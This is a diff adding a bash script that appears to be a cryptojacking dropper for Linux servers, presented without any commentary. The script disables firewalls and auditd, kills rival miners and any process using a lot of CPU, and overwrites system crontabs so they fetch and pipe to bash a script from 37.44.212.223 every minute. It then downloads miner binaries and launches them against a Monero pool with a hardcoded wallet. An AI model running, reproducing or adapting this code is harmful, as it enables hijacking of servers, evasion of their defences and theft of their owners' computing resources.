@@ -1,0 +1,383 @@
+#!/bin/bash
+mkdir /var/tmp
+chattr -i /usr/bin/wget
+chmod 755 /usr/bin/wget
+chattr -i /usr/bin/curl
+chmod 755 /usr/bin/curl
+pkill crond
+/etc/init.d/crond start
+service crond start
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+pkill -f sysxlj
+pkill -f jourxlv
+pkill -f sustes
+touch /etc/ld.so.preload
+netstat -antp | grep '56415' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '139.99.120.75' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '107.191.99.95' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '107.191.99.227' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '213.32.29.143' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+rm -rf /usr/lib/void.so
+rm -rf /etc/voidonce.sh
+rm -rf /usr/local/lib/libjdk.so
+rm -rf /usr/local/lib/libntp.so
+ps aux|grep "I2NvZGluZzogdXRmLTg"|grep -v grep|awk '{print $2}'|xargs kill -9
+sed -i '$d' /etc/crontab
+rm -rf /lib64/library1.so
+rm -rf /usr/lib64/library1.so
+iptables -A INPUT -s 185.234.217.11 -j DROP
+iptables -A OUTPUT -d 185.234.217.11 -j DROP
+iptables -A INPUT -s 185.234.217.11 -j REJECT
+iptables -I OUTPUT -s 167.99.166.61 -j DROP
+iptables -I INPUT -s 167.99.166.61 -j DROP
+iptables -I INPUT -s 107.191.99.95 -j DROP
+iptables -I INPUT -s 107.191.99.95 -j REJECT
+iptables -I INPUT -s 107.191.99.227 -j DROP
+iptables -I INPUT -s 107.191.99.227 -j REJECT
+iptables -I INPUT -s 213.32.29.143 -j DROP
+iptables -I INPUT -s 5.255.86.129 -j DROP
+iptables -I INPUT -s 5.255.86.129 -j REJECT
+iptables -I OUTPUT -p tcp -m string --string "pastebin" --algo bm -j DROP
+iptables -I OUTPUT -p udp -m string --string "pastebin" --algo kmp -j DROP
+rm -rf /etc/cron.monthly/oanacroner  
+rm -rf /etc/cron.daily/oanacroner
+rm -rf /etc/cron.hourly/oanacroner
+rm -rf /usr/local/bin/dns
+echo "" > /etc/crontab
+echo "" > /etc/cron.d/root
+echo "" > /etc/cron.d/apache
+echo "" > /var/spool/cron/root
+echo "" > /var/spool/cron/crontabs/root
+chkconfig --del netdns
+pkill -f netdns
+echo "" > /etc/cron.d/system
+chmod 777 /var/tmp
+rm -rf /usr/local/bin/dns
+rm -rf /usr/sbin/netdns
+rm -rf /etc/init.d/netdns
+rm -rf /etc/cron.monthly/oanacroner  
+rm -rf /etc/cron.daily/oanacroner
+rm -rf /etc/cron.hourly/oanacroner
+chattr -i /usr/local/lib/libntpd.so
+chmod 777 /usr/local/lib/libntpd.so
+rm -rf /usr/local/lib/libntpd.so
+sed -i '/libntpd.so/d'  /etc/ld.so.preload
+crontab -l | sed '/pastebin.com/d' | crontab -
+netstat -antp | grep '27.155.87.59' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '27.155.87.59' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'CLOSE_WAIT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '121.18.238.56' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '121.18.238.56' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '103.99.115.220' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '103.99.115.220' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '213.32.29.143' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '213.32.29.143' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '5.255.86.129' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '5.255.86.129' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+pkill -f /usr/bin/.sshd
+netstat -antp | grep '158.69.133.20:3333'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep 'proxkekman.ml:8080'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '213.32.29.143:14444'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+netstat -antp | grep '5.255.86.129:3333'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
+rm -rf /var/tmp/j*
+rm -rf /tmp/j*
+rm -rf /var/tmp/java
+rm -rf /tmp/java
+rm -rf /var/tmp/java2
+rm -rf /tmp/java2
+rm -rf /var/tmp/java*
+rm -rf /tmp/java*
+chattr -i /usr/lib/libiacpkmn.so.3 && rm -rf /usr/lib/libiacpkmn.so.3
+chattr -i /etc/init.d/nfstruncate && rm -rf /etc/init.d/nfstruncate
+rm -rf /etc/rc.d/rc*.d/S01nfstruncate /bin/nfstruncate
+rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
+rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
+rm -rf /tmp/*index_bak*
+rm -rf /tmp/*httpd.conf*
+rm -rf /tmp/*httpd.conf
+rm -rf /tmp/a7b104c270
+rm -rf /var/tmp/.z
+rm -rf /tmp/.FILE
+rm -rf /tmp/.xm
+rm -rf /tmp/.iokb21
+rm -rf /tmp/.bzc bzc.tgz*
+rm -rf /var/tmp/.xm.log
+pkill -9 56545
+pkill -9 Word
+pkill -9 "  "
+pkill -9 xds
+pkill -9 httpd.conf
+pkill -9 yam
+pkill -9 xd
+pkill -9 .syslog
+pkill -9 wipefs
+pkill -9 " "
+pkill -9 auditd
+pkill -9 crondb
+pkill -9 syn
+pkill -9 xnetd
+pkill -9 ld-linux-x86-64
+pkill -9 xm64
+pkill -9 xs
+pkill -9 xm32
+pkill -9 kthreadd
+pkill -9 watchdogs
+pkill -9 xmrig64
+pkill -9 xig
+pkill -9 ps
+pkill -9 minerd
+pkill -9 smh64
+pkill -9 system.usermn
+pkill -9 skrt
+pkill -9 .xm.log
+pkill -9 zjgw
+pkill -9 SSHer
+pkill -9 .dhpcd
+pkill -9 xm
+pkill -f ld-linux-x86-64
+pkill -f xm64
+pkill -f xm32
+pkill -f xig
+pkill -f minerd
+pkill -f ps
+pkill -f .xm
+rm -rf /tmp/.uninstall* /tmp/.python* /tmp/.tables* /tmp/.mas
+rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
+netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+echo -e "*/1 * * * * root (curl -s http://37.44.212.223/xdd.sh||wget -q -O - http://37.44.212.223/xdd.sh)|bash -sh\n##" > /etc/cron.d/root
+echo -e "*/2 * * * * root (curl -s http://37.44.212.223/xdd.sh||wget -q -O - http://37.44.212.223/xdd.sh)|bash -sh\n##" > /etc/cron.d/apache
+echo -e "*/30 * * * *	(curl -s http://37.44.212.223/xdd.sh||wget -q -O - http://37.44.212.223/xdd.sh)|bash -sh\n##" > /var/spool/cron/root
+mkdir -p /var/spool/cron/crontabs
+echo -e "* * * * *	(curl -s http://37.44.212.223/xdd.sh||wget -q -O - http://37.44.212.223/xdd.sh)|bash -sh\n##" > /var/spool/cron/crontabs/root
+mkdir -p /etc/cron.hourly
+(curl -fsSL --connect-timeout 120 http://37.44.212.223/11 -o /etc/cron.hourly/oanacroner1||http://37.44.212.223/11 -O /etc/cron.hourly/oanacroner1) && chmod 755 /etc/cron.hourly/oanacroner1
+chmod 777 /var/tmp/r1x
+ps aux | grep -vw 'kworkerdssx\|r1x' | awk '{if($3>30.0) print $2}' | while read procid
+do
+kill -9 $procid
+done
+ps ax | grep /tmp/ | grep -v grep | grep -v 'kworkerdssx\|r2x\|kworkerdssx\|r1x\|ppl' | awk '{print $1}' | xargs kill -9
+ps ax | grep 'xd.json\|wq.conf\|wm.conf' | grep -v grep | grep -v 'kworkerdssx\|r1x\|kworkerdssx\|r1x\|ppl' | awk '{print $1}' | xargs kill -9
+netstat -ant|grep '54.36.137.146:3333\|37.59.162.30:3333'|grep 'ESTABLISHED'|grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+curl http://37.44.212.223/2xd.sh | bash -sh
+fi
+sleep 2
+netstat -ant|grep '54.36.137.146:3333\|37.59.162.30:3333'|grep 'ESTABLISHED'|grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+curl http://37.44.212.223/3xd.sh | bash -sh
+curl http://37.44.212.223/4xd.sh | bash -sh
+fi
+DIR="/var/tmp"
+if [ -a "/var/tmp/r1x" ]
+then
+    if [ -w "/var/tmp/r1x" ] && [ ! -d "/var/tmp/r1x" ]
+    then
+        if [ -x "$(command -v md5sum)" ]
+        then
+            sum=$(md5sum /var/tmp/r1x | awk '{ print $1 }')
+            echo $sum
+            case $sum in
+                5fc34986f39711c178161699260bba85 | 5fc34986f39711c178161699260bba85)
+                    echo "r1x OK"
+                ;;
+                *)
+                    echo "r1x wrong"
+                    pkill -f xd.json
+                    pkill -f r1x
+                    sleep 4
+                ;;
+            esac
+        fi
+        echo "P OK"
+    else
+        DIR=$(mktemp -d)/var/tmp
+        mkdir $DIR
+        echo "T DIR $DIR"
+    fi
+else
+    if [ -d "/var/tmp" ]
+    then
+        DIR="/var/tmp"
+    fi
+    echo "P NOT EXISTS"
+fi
+if [ -d "/var/tmp/r1x" ]
+then
+    DIR=$(mktemp -d)/var/tmp
+    mkdir $DIR
+    echo "T DIR $DIR"
+fi
+WGET="wget -O"
+if [ -s /usr/bin/curl ];
+then
+    WGET="curl -o";
+fi
+if [ -s /usr/bin/wget ];
+then
+    WGET="wget -O";
+fi
+f2="37.44.212.223"
+
+downloadIfNeed()
+{
+    if [ -x "$(command -v md5sum)" ]
+    then
+        if [ ! -f $DIR/r1x ]; then
+            echo "File not found!"
+            download
+        fi
+        sum=$(md5sum $DIR/r1x | awk '{ print $1 }')
+        echo $sum
+        case $sum in
+            5fc34986f39711c178161699260bba85 | 5fc34986f39711c178161699260bba85)
+                echo "r1x OK"
+            ;;
+            *)
+                echo "r1x wrong"
+                sizeBefore=$(du $DIR/r1x)
+                if [ -s /usr/bin/curl ];
+                then
+                    WGET="curl -k -o ";
+                fi
+                if [ -s /usr/bin/wget ];
+                then
+                    WGET="wget --no-check-certificate -O ";
+                fi
+                #$WGET $DIR/r1x https://transfer.sh/wbl5H/r1x
+                download
+                sumAfter=$(md5sum $DIR/r1x | awk '{ print $1 }')
+                if [ -s /usr/bin/curl ];
+                then
+                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/r1x` > $DIR/var/tmp.txt
+                fi
+            ;;
+        esac
+    else
+        echo "No md5sum"
+        download
+    fi
+}
+
+download() {
+    if [ -x "$(command -v md5sum)" ]
+    then
+        sum=$(md5sum $DIR/r1x3 | awk '{ print $1 }')
+        echo $sum
+        case $sum in
+            5fc34986f39711c178161699260bba85 | 5fc34986f39711c178161699260bba85)
+                echo "r1x OK"
+                cp $DIR/r1x3 $DIR/r1x
+            ;;
+            *)
+                echo "r1x wrong"
+                download2
+            ;;
+        esac
+    else
+        echo "No md5sum"
+        download2
+    fi
+}
+
+download2() {
+    if [ `getconf LONG_BIT` = "64" ]
+    then
+        $WGET $DIR/r1x http://37.44.212.223/rig
+    else
+        $WGET $DIR/r2x http://37.44.212.223/x32
+    fi
+
+    if [ -x "$(command -v md5sum)" ]
+    then
+        sum=$(md5sum $DIR/r1x | awk '{ print $1 }')
+        echo $sum
+        case $sum in
+            5fc34986f39711c178161699260bba85 | 5fc34986f39711c178161699260bba85)
+                echo "r1x OK"
+                cp $DIR/r1x $DIR/r1x3
+            ;;
+            *)
+                echo "r1x wrong"
+            ;;
+        esac
+    else
+        echo "No md5sum"
+    fi
+}
+
+judge() {
+    if [ ! "$(netstat -ant|grep '54.36.137.146:3333\|37.59.162.30:3333'|grep 'ESTABLISHED'|grep -v grep)" ];
+    then
+        ps axf -o "pid %cpu" | awk '{if($2>=30.0) print $1}' | while read procid
+	      do
+	      kill -9 $procid
+        done
+        downloadIfNeed
+        touch /var/tmp/123
+        pkill -f /var/tmp/java
+        pkill -f w.conf
+        chmod +x $DIR/r1x
+        $WGET $DIR/xd.json http://$f2/xd.json
+        nohup $DIR/r1x -c $DIR/xd.json > /dev/null 2>&1 &
+        nohup $DIR/r2x --donate-level=1 -k -o 54.36.137.146:3333 -p x -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -B > /dev/null 2>&1 &        sleep 5
+    else
+       echo "Running"
+    fi
+}
+
+judge2() {
+    if [ ! "$(ps -fe|grep 'r1x'|grep 'xd.json'|grep -v grep)" ];
+    then
+        downloadIfNeed
+        chmod +x $DIR/r1x
+        $WGET $DIR/xd.json http://$f2/xd.json
+        nohup $DIR/r1x -c $DIR/xd.json > /dev/null 2>&1 &
+        nohup $DIR/r2x --donate-level=1 -k -o 54.36.137.146:3333 -p x -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -B > /dev/null 2>&1 &
+        sleep 5
+    else
+        echo "Running"
+    fi
+}
+
+if [ ! "$(netstat -ant|grep 'LISTEN\|ESTABLISHED\|TIME_WAIT'|grep -v grep)" ];
+then
+    judge2
+else
+    judge
+fi
+
+if crontab -l | grep -q "37.44.212.223"
+then
+    echo "Cron exists"
+else
+    crontab -r
+    echo "Cron not found"
+    LDR="wget -q -O -"
+    if [ -s /usr/bin/curl ];
+    then
+        LDR="curl";
+    fi
+    if [ -s /usr/bin/wget ];
+    then
+        LDR="wget -q -O -";
+    fi
+	(crontab -l 2>/dev/null; echo "* * * * * $LDR http://37.44.212.223/xdd.sh | bash -sh > /dev/null 2>&1")| crontab -
+fi
+rm -rf /var/tmp/jrm
+rm -rf /tmp/jrm
+pkill -f 185.222.210.59
+pkill -f 95.142.40.81
+pkill -f 192.99.142.232
+chmod 777 /var/tmp/r1x
